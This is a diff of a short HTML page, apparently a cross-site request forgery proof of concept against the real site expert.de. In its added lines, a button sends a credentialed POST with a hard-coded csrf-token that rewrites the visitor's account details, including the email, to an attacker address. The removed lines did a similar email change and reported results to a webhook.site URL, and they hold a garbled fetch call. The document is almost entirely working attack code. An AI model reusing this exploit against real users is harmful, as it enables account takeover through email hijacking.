@@ -1,23 +1,36 @@
 <!doctype html>
 <html lang="pt">
+<title>Expert.de – CSRF PoC</title>
 <meta charset="utf-8">
-<title>ats-expert</title>
-<body>
-<script>
-  const HOOK='https://webhook.site/2a5229f5-4161-44c1-b1ee-dcd9c8c76e3c';
-  function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}
+<body style="font-family:sans-serif;text-align:center;margin-top:20vh">
+  <h2>Clique abaixo para alterar o e-mail da sua conta</h2>
+  <button onclick="poc()">Executar CSRF</button>
+  <pre id="log"></pre>
 
-  fetch("https://fetch("https://www.expert.de/api/v1/user", {
-    method: "PUT",
-    credentials: "include",
-    headers: {
-      "Content-Type": "application/json",
-      "csrf-token": "1e206742-fb4a-44d2-8174-be9b2e2d6425"
+<script>
+function log(txt){document.getElementById('log').textContent+=txt+'\n';}
+
+function poc(){
+  log('Enviando...');
+  fetch('https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData',{
+    method:'POST',
+    credentials:'include',
+    headers:{
+      'Content-Type':'application/json',
+      'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
     },
-    body: JSON.stringify({email:"evil@bitoini.com"})
+    body:JSON.stringify({
+      userData:{
+        firstname:'Ana',
+        lastname:'Silvana',
+        email:'csrf-poc@evil.example',
+        birthday:-86400000,
+        gender:'FEMALE'
+      }
+    })
   })
-  .then(r => r.status)
-  .then(s => log("trocae-mail="+s));
+  .then(r=>{log('HTTP '+r.status); return r.text()})
+  .then(t=>log('Resposta: '+t))
+  .catch(e=>log('Erro: '+e));
+}
 </script>
-</body>
-</html>
